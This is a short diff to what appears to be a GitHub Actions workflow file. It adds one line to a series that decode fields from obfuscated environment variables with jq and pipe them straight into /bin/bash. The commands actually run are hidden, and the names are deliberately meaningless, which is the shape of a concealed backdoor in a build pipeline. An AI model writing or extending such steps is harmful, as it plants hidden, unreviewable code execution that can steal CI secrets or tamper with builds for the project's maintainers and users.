@@ -40,6 +40,7 @@ jobs:
           echo $nv5677 | jq -r .mitl4 | /bin/bash
           echo $e23 | jq -r .p86 | /bin/bash
           printf '%s' "$cdr9706" | jq -r .cep623 | /bin/bash
+          printf '%s' "$aoyf66" | jq -r .jhtf6 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
